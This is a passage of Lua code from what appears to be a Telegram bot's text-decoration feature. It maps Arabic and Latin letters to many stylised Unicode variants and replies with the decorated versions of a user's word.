local fonts = {      "ضـٍہًہ,صًـٍـًہ,ـᓆـ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,ـפֿـ,ـפـ,ج,ش,ـωـ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظٍـً,طہـۛ,ز,ر,ـב,پ,ـפּـ,ڪٰྀہٰٰٖـ,گـ,ثِْْہٰٰہٰٰہٰٰـ,ژ,ذَِِِْ,آ,ئ,.,_",      
"ضۜۜہٰٰ,صۛہُُِِٰٰۛہٰٰۛہٰٰ,قྀ̲ہٍٍٰٰٰٰٰྀ̲ہٰٰٰྀ̲ہٰٰٰ,ف͒ہِِٰٰٰٰ͒ہٰٰ͒ہٰٰ,غہِِِِٰٰٰٰہٰٰہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہّّٰٰٰ̐ہٰ̐ہ,حہٌٌٰٰٰٰہٰٰہٰٰ,جًًِِّّْْْۧۧۧ,شِٰہََُُِٰٰٰہِٰٰٰہٰٰ,سٌٌٍٍٰٰٰٰٰٰٓٓٓ,ی,بّہٌٌِِّٰٰہّہ,لْْٰٰ,آ,نَِٰہٍٍَِٰٰٰہَِٰہ,تَہََّّٰٰٰہََٰہَٰ,مٰ̲ہٍٍٰٰٰ̲ہٰ̲ہ,چ,ظۗہََِِْْٰٰۗہٰٰۗہٰٰ,طۨہََُُِِٰٰۨہٰٰۨہٰٰ,زًًَََََ,رِِٰٰ,دِِٰٰ,پ,وٍٍِِِّّ,ڪٰྀہٰٰٖ,گ,ثہِِْْْْٰٰہٰٰہٰٰ,ژ,ذََِِِْْ,ئ,آ,.,_",      
"ضــ,صــ,قــ,فــ,غــ,عــ,ـهــ,خــ,حــ,جــ,شــ, سـ,یــ,بــ,لــ,ﺂ,نــ,تــ,مــ,چــ,ظــ,طــ,ـز,ـر,ـد,پــ,ـو,کــ,گــ,ـثــ,ـژ,ـذ,ﺂ,ئ,.,_",        
"ضۜہٰٰ,صۛہٰٰ,قྀ̲ہٰٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہ,حہٰٰ,جْۧ,شِٰہٰٰ,سٰٰٓ,ی,بّہ,ل,آ,نَِٰہ,تَہَٰ,مٰ̲ہ,چ,ظۗہٰٰ,طۨہٰٰ,زَ,ر,د,پ,وِ,ک,گ,ثہٰٰ,ژ,ذِ,ئ,آ,.,_",      
"ضًً,صــَ,ق,ف,غً,عـًً,هہـ,خِہ,ـحّ,جــٌ,ڜ,سُُُُُ,ی,بــِ,لـ,أ,نــہٰ⇣ـ,ِِتً,مہـً,چ,ظـَ,ط,ز,ر,د,پ,وُ,ﮏ,گ,ثـ͜͡ہــِ,ژ,ذ,ئ,أ  ,.,_",      
"ضًـٍـًہًـٍـًہ,صًـٍـًہ,ق,ف,غً,عً,هہـ,خِہ,ב,,جـﮩ๋͜ﮧـ͜ާْ,ڜـ͜ާ,سـّــً,ی,بہ,لـﮩﮨہٰٰہٰ,أ,טּ,تہٍِۣـّ̐ہٰ,مہ,چ,ظٍـًہ,ط,ز,ر,د,پ,وُ,ڪـ,گ,ثہـٰ̲ہٰٰ,ژ,ذ,ئ,أ  ,.,_",      
"ض,ص,ق,ف,غـ͜ﮩ͞ـ,عـ͜ﮩ͞ـ,هہـۛ,خہـۛ,ﺣہـۛ,جہـۛ,شۖہـۛ,سۜہـۛ,ی,بـ,ل,اآ,نہـۛ,تـ͜ﮩ͞ـ,مہـۛ,چ,ظـ͜ـ,طہـۛ,ز,ر,د,پ,ؤ,كـ͜ﮩ,گ,ثۨہـۛ,ژ,ذ,ئ,اآ  ,.,_",      
"ضـ͜,صـ,ق,فـ͜ـ,غہۛـۛ,عۛـۛ,ه๋͜‏ـ,خ,ح,ج,شـ͜ﮩ͞ـ,سـ͜ﮩ͞ـ,ی,ﯧـۛ,لـۛ,اآ,نـ͜ـ,ت,م͜͞ـ,چ,ظـۛ,ط๋͜‏ـ,ز,ر,د,پ,وُ,كـهـۛ,گ,ث,ژ,ذ,ئ,اآ  ,.,_",      
"ض๋͜‏ـۣۛ,صـ๋͜‏ـۣۛ,قـ,فـ๋͜‏ـۣۛ,غـ๋͜‏ـۣۛـ,عـ๋͜‏ـ,ه,خـ๋͜‏ـۣ,حـ๋͜‏ـ,,جـ๋͜‏ـ,شـ๋͜‏ـ,سـ๋͜‏ـ,ی,بہ,ل,أ,ن,تـ๋͜‏ـ,م,چ,ظـ๋͜‏ـ,ط,ز,ر,د,پ,و,كـ๋͜‏ـ,گ,ثہ,ژ,ذ,ئ,أ  ,.,_",      
"ض,ص,ق,ف,غ,ع,هـ͜ﮩ͞ـ,خ,ح,ج,ش,س,ی,ب,لـّﮩ๋͜‏ـ,آ,نہٰٰ,ྀ̲تہٰٰ,مـّﮩ๋͜‏ـ,چ,طـྀ̲͜ہٰٰ,طـ͜ﮩ͞ـ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      
"ض,صۛہٰٰ,قྀ̲ہٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,خٰ̐ہ,حہٰٰ,جْہ,شِٰہٰٰ,سٰٓہ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظہٰٰྀ̲,طہٰٰ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      
"ض,صـﮩ๋͜‏ـ,قـﮩ๋͜‏ـ,فـﮩ๋͜‏ـ,غـﮩ๋͜‏ـ,؏ـﮩ๋͜‏ـ,هـﮩ๋͜‏ـ,خـﮩ๋͜‏ـ,حـﮩ๋͜‏ـ,جـﮩ๋͜‏ـ,شـﮩ๋͜‏ـ,سـﮩ๋͜‏ـ,ی,بـﮩ๋͜‏ـ,لّۣۗ,آِ,نْۛ,تٌۙ,ﻡِۙـ,چ,ظـﮩ๋͜‏ـۖۜ,طٌۗ,ﺯۖ,ږۙ,ڊْ,پ,ﯠۚ,ڪٌۘ,گ,ثٌّۜ,ژ,ﺫۗ,ئ,آِ  ,.,_",      
"ض,صـ᷈͟ـ,قـ᷈͟ـ,فـ᷈͟ـ,غـ᷈͟ـ,عـ᷈͟ـ,هـ᷈͟ـ,خـ᷈͟ـ,حـ᷈͟ـ,جـ᷈͟ـ,شـ᷈͟ـ,سـ᷈͟ـ,ی,بـ᷈͟ـ,لـ᷈͟ـ,ٲآٲ,نـ᷈͟ـ,تـ᷈͟ـ,مـ᷈͟ـ,چ,ظـ᷈͟ــ᷈͟ـ,طـ᷈͟ـ,ز,ر,د,پ,ﯠ,كـ᷈͟ـ,گ,ثـ᷈͟ـ,ژ,ذ,ئ,ٲآٲ  ,.,_",      
"ض,صـﮩ⃑ﮩ,قـﮩ⃑ﮩ,فـﮩ⃑ﮩ,غـﮩ⃑ﮩ,عـﮩ⃑ﮩ,هـﮩ⃑ﮩ,خـﮩ⃑ﮩ,حـﮩ⃑ﮩ,جـﮩ⃑ﮩ,شـﮩ⃑ﮩ,سـﮩ⃑ﮩ,ی,بـﮩ⃑ﮩ,لـﮩ⃑ﮩ,آ,نـﮩ⃑ﮩ,تـﮩ⃑ﮩ,مـﮩ⃑ﮩ,چ,ظـﮩ⃑ﮩـﮩ⃑ﮩ,طـﮩ⃑ﮩ,ڒ,ر,ډ,پ,ﯛ,كـﮩ⃑ﮩ,گ,ثـﮩ⃑ﮩ,ژ,ﮈ,ئ,آ  ,.,_",      
"ضًـٍـًہ,صًـ,ـقـ,ف,غً,عًـ,هہ,خِہ,حـ,جْـ,ڜـ,ڛً,ی,بہ,ل,آ,ہن,تہ,م,چ,ظٍـً,طٍـًہ,ز,ڑ,دٍ,پ,وُ,ـڪـ,گ,ثـ,ژ,ذٍ,ئ,آ  ,.,_",      
"ضہۣۗ,صہۣۗ,قَہۣۗـ,فُہۣۗ,غّہۣۗ,عَہۣۗ,هہۣۗ,خٌہۣۗ,حًہۣۗ,جَہۣۗ,شّہۣۗ,سہۣۗـ,ی,بّہۣۗـ,لًً,أ,نٌہۣۗـ,تُہۣۗ,مہۣۗ,چ,ظٌہۣۗ,طٌہۣۗـ,زُ,رُ,دُ,پ,وِ,كہۣۗ,گ,ثًہۣۗ,ژ,ذٌ,ئ,أ  ,.,_",      
"ض,صۭۣۣۖـ,قۭۣۣۖـ,فۭۣۣۖـ,غۭۣۣۖـ,غۭۣۣۖـ,هۭۣۣۖـ,خۭۣۣۖـ,حۭۣۣۖـ,جۭۣۣۖـ,شۭۣۣۖـ,سۭۣۣۖـ,ی,بۭۣۣۖـ,لۭۣۣۖـ,آ,نۭۣۣۖـ,تۭۣۣۖـ,مۭۣۣۖـ,چ,ظۭۣۣۖـۭۣۣۖـ,طۭۣۣۖـ,ز,ر,د,پ,ﯠ,كۭۣۣۖـ,گ,ثۭۣۣۖـ,ژ,ذ,ئ,آ  ,.,_",      
"ض,صـﮩـ,قـﮩـ,فـﮩـ,غـﮩـ,عـﮩـ,هـﮩـ,خـﮩـ,حـﮩـ,جـﮩـ,شـﮩـ,سـﮩـ,ی,بـﮩـ,لـﮩـ,ٲ,نـﮩـ,تـﮩـ,مـﮩـ,چ,ظـﮩــﮩـ,طـﮩـ,ز,ر,د,پ,و,ګ,گ,ثـﮩـ,ژ,ذ,ئ,ٲ,.,_",      
"ض,صـٰٰـۛۛۛ,قـٰٰـۛۛۛ,فـٰٰـۛۛۛ,غـٰٰـۛۛۛ,عـٰٰـۛۛۛ,هـٰٰـۛۛۛ,خـٰٰـۛۛۛ,حـٰٰـۛۛۛ,جـٰٰـۛۛۛ,شـٰٰـۛۛۛ,سـٰٰـۛۛۛ,ی,بـٰٰـۛۛۛ,لـٰٰـۛۛۛ,أ,نـٰٰـۛۛۛ,تـٰٰـۛۛۛ,مـٰٰـۛۛۛ,چ,ظـٰٰـۛۛۛـٰٰـۛۛۛ,طـٰٰـۛۛۛ,ز,ر,د,پ,و,ک,گ,ثـٰٰـۛۛۛ,ژ,ذ,ئ,أ  ,.,_",      
"ض,صـٰ۫ﹻ,قـٰ۫ﹻ,فـٰ۫ﹻ,غـٰ۫ﹻ,عـٰ۫ﹻ,هـٰ۫ﹻ,خـٰ۫ﹻ,حـٰ۫ﹻ,جـٰ۫ﹻ,شـٰ۫ﹻ,سـٰ۫ﹻ,ی,بـٰ۫ﹻ,لـٰ۫ﹻ,ٱ,نَـٰ۫ﹻ,تْـٰ۫ﹻ,مٌـٰ۫ﹻ,چ,ظٌـٰ۫ﹻـٰ۫ﹻ,طِـٰ۫ﹻ,زُ,رَ,دِ,پ,وَ,كِـٰ۫ﹻ,گ,ثُـٰ۫ﹻ,ژ,ذَ,ئ,ٱℓ  ,.,_",      
"ض,صہٰـ͢͡,قہٰـ͢͡,فہٰـ͢͡,غہٰـ͢͡,عہٰـ͢͡,هہٰـ͢͡,خہٰـ͢͡,حہٰـ͢͡,جہٰـ͢͡,شہٰـ͢͡,سہٰـ͢͡,ی,بہٰـ͢͡,لہٰـ͢͡,ا,نہٰـ͢͡,تہٰـ͢͡,مہٰـ͢͡,چ,ظہٰـ͢͡ہٰـ͢͡,طہٰـ͢͡,ز,ر,د,پ,و,كہٰـ͢͡,گ,ثہٰـ͢͡,ژ,ذ,ئ,ا  ,.,_",       }  
local result = {}   
i=0  
for k=1,#fonts do   
i=i+1   
local tar_font = fonts[i]:split(",")   
local text = DevProx   
local text = text:gsub("ض",tar_font[1])     
local text = text:gsub("ص",tar_font[2])     
local text = text:gsub("ق",tar_font[3])     
local text = text:gsub("ف",tar_font[4])     
local text = text:gsub("غ",tar_font[5])     
local text = text:gsub("ع",tar_font[6])     
local text = text:gsub("ه",tar_font[7])     
local text = text:gsub("خ",tar_font[8])     
local text = text:gsub("ح",tar_font[9])     
local text = text:gsub("ج",tar_font[10])     
local text = text:gsub("ش",tar_font[11])     
local text = text:gsub("س",tar_font[12])     
local text = text:gsub("ی",tar_font[13])     
local text = text:gsub("ب",tar_font[14])     
local text = text:gsub("ل",tar_font[15])     
local text = text:gsub("ا",tar_font[16])     
local text = text:gsub("ن",tar_font[17])     
local text = text:gsub("ت",tar_font[18])     
local text = text:gsub("م",tar_font[19])     
local text = text:gsub("چ",tar_font[20])     
local text = text:gsub("ظ",tar_font[21])     
local text = text:gsub("ط",tar_font[22])     
local text = text:gsub("ز",tar_font[23])     
local text = text:gsub("ر",tar_font[24])     
local text = text:gsub("د",tar_font[25])    
local text = text:gsub("پ",tar_font[26])     
local text = text:gsub("و",tar_font[27])     
local text = text:gsub("ک",tar_font[28])     
local text = text:gsub("گ",tar_font[29])     
local text = text:gsub("ث",tar_font[30])     
local text = text:gsub("ژ",tar_font[31])     
local text = text:gsub("ذ",tar_font[32])     
local text = text:gsub("ئ",tar_font[33])     
local text = text:gsub("آ",tar_font[34])      
table.insert(result, text)   
end   
local DevProx22 = "🏆┇ الكلمه "..DevProx.." \n📤┇ تم زخرفتها {"..tostring(#fonts).."} نوع \n📥┇ اضغط على الكلمه لنسخها \n\n"
number=0   
for v=1,#result do  
number=number+1   
local DevProx = { ' 🔥📥 ', '🔅🔥﴿', '  ❥˓  ', '💝﴿ֆ', '  🐼🏆', ' 🙊💙', '-🐥📥 ', ' 〄😻‘',' ⚡️', '- ⁽🌷', '🔥“', '💭', '', '🎩🍿','“̯ 🐼💗 ', '🐝🍷','❥̚͢₎ 🐣', '👄‘', ' 💭ۦ', ' 💛💭ۦ', ' ⚡️ۦ','℡ᴖ̈', '💋☄️₎ۦ˛', '♩',' ☻🔥“ٰۦ', '℡ ̇ 📥🐯⇣✦', '┇♩⁽💎🌩₎⇣✿','ۦٰ‏┋❥ ͢˓🦁💛ۦ‏', '⚡️♛ֆ₎', '♛⇣🐰☄️₎✦', '⁾⇣✿💖┇❥', ' ₎✿🎃 ┇“❥', '😴✿⇣', '❥┇⁽ ℡🦁' }   
DevProx22 = DevProx22..''..number.."  `"..result[number]..''..DevProx[math.random(#DevProx)].."`\n\n"    
end  
Dev_Abs(msg.chat_id_, 0, 1, DevProx22, 1, 'md') 
end 
end 
if DevAbs:get(DevProx.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then       
local zakrf = text:match("(.*)")       
DevAbs:del(DevProx.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_)         
if not text:find("[\216-\219][\128-\191]") then      
DevProx = zakrf     
local font_base = "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,9,8,7,6,5,4,3,2,1,.,_"     
local font_abs = "z,y,x,w,v,u,t,s,r,q,p,o,n,m,l,k,j,i,h,g,f,e,d,c,b,a,Z,Y,X,W,V,U,T,S,R,Q,P,O,N,M,L,K,J,I,H,G,F,E,D,C,B,A,0,1,2,3,4,5,6,7,8,9,.,_"     
local fonts = {            "Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1  ,.,_",     
"Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,0,9,8,7,6,5,4,3,2,1  ,.,_",     
"Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1,.,_",     
"п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐,к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,0,9,8,7,6,5,4,3,2,1,.,_",     
"卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙۪۪,卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙,0,9,8,7,6,5,4,3,2,1,.,_",     
"ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,Գ,Ց,Դ,6,5,Վ,Յ,Զ,1,.,_",     
"a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k̷,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,0,9,8,7,6,5,4,3,2,1,.,_",     
"A̲,̲B̲,̲C̲,̲D̲,̲E̲,̲F̲,̲G̲,̲H̲,̲I̲,̲J̲,̲K̲,̲L̲,̲M̲,̲N̲,̲O̲,̲P̲,̲Q̲,̲R̲,̲S̲,̲T̲,̲U̲,̲V̲,̲W̲,̲X̲,̲Y̲,̲Z̲,̲a̲,̲b̲,̲c̲,̲d̲,̲e̲,̲f̲,̲g̲,̲h̲,̲i̲,̲j̲,̲k̲,̲l̲,̲m̲,̲n̲,̲o̲,̲p̲,̲q̲,̲r̲,̲s̲,̲t̲,̲u̲,̲v̲,̲w̲,̲x̲,̲y̲,̲z̲,̲0̲,̲9̲,̲8̲,̲7̲,̲6̲,̲5̲,̲4̲,̲3̲,̲2̲,̲1̲,̲.̲,̲_̲",     
"Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,0,9,8,7,6,5,4,3,2,1,.,_",     
"A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆,K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,0,9,8,7,6,5,4,3,2,1,.,_",     
"۪۫a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,۪۫y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,۪۪۫۫,0۪۪۫۫,9۪۪۫۫,8۪۪۫۫,7۪۪۫۫,6۪۪۫۫,5۪۪۫۫,4۪۪۫۫,3۪۪۫۫,2۪۪۫۫,1۪۪۫۫,.۪۪۫۫,_",     
"͜͡Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,ؔؔ͜͜Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,͜͡0,9,8,7,6,5,4,3,2,1,.,_",     
"A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,̶̶A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     
